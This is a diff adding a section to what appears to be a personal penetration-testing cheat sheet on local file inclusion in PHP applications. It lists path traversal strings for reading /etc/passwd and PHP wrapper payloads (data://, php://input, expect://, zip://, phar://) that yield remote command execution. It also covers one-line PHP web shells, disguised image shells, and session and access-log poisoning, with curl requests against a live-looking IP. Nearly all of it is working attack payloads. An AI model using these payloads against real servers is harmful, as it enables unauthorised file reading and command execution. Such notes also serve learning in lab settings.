@@ -656,6 +656,78 @@ Found an admin dashboard in Shodan.
 
 
 ----------------------------------------------------------------------------------------------
+lang=../../../../../../../../../etc/passwd
+lang=....//....//....//....//etc/passwd
+lang=..././..././..././..././etc/passwd
+lang=...\/...\/...\/...\/etc/passwd
+use encoding = double encoding = trible encoding 
+/etc/passwd/.
+////etc/passwd
+/etc/./passwd
+///etc/passwd	=> for linux 
+
+echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
+
+/etc/passwd%00
+/etc/passwd%00.php
+
+
+try to use 
+
+step 1 	- 		?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini" 
+base64 deconding 
+if found (( allow_url_include=on))
+then you can include data and rce 
+use # echo '<?php system($_GET["cmd"]); ?>' | base64		==> PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8
+?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
+you will know the id and any other command 
+
+hossamshady101@htb[/htb]$ curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
+
+└─$ curl -s -X POST --data '<?php system("id") ?>' "http://167.172.54.11:30582/index.php?language=php://input" | grep uid
+
+repeating step one to see if found (( expect ))  in config file 
+after that use 
+#curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
+
+sudo python -m pyftpdlib -p 21 			==> make ftp server and connect to it by ftp://ip
+impacket-smbserver -smb2support share $(pwd)			==> make smb server and connect to it by //ip
+
+
+
+echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif		==> To execute gif file 
+
+echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php		==> zip shell.php to shell.jpg
+
+language=zip://./profile_images/shell.jpg%23shell.php&cmd=id			==> execute
+
+
+shell.php
+		<?php
+		$phar = new Phar('shell.phar');
+		$phar->startBuffering();
+		$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
+		$phar->setStub('<?php __HALT_COMPILER(); ?>');
+		$phar->stopBuffering();
+
+hossamshady101@htb[/htb]$ php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg		==> convert shell.php to shell.phar
+language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id				==> execute 
+
+
+
+places of session files 
+ C:\Windows\Temp\
+ /var/lib/php/sessions/sess_	
+ to inject the session with url as 
+ 1- go to https://example.com?lang=hossamshady
+ 2- go to session file and see if hossamshady reflected there or not if yes then 	==> lang=/var/lib/php/sessions/sess_<session_token_here>	==> be attension of (sess_) token
+ 3- put ?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E			==> <?php system($_GET['cmd'])>  url encoded
+ 4- go back to access session file with &cmd=id
+ 
+ to inject access log file with User-Agent: <?php system($_GET['cmd'])>
+ and go to access log file with ?/language=/var/log/apache2/access.log&cmd=id
+
+----------------------------------------------------------------------------------------------------
   
   Path traversal to LFI 
 
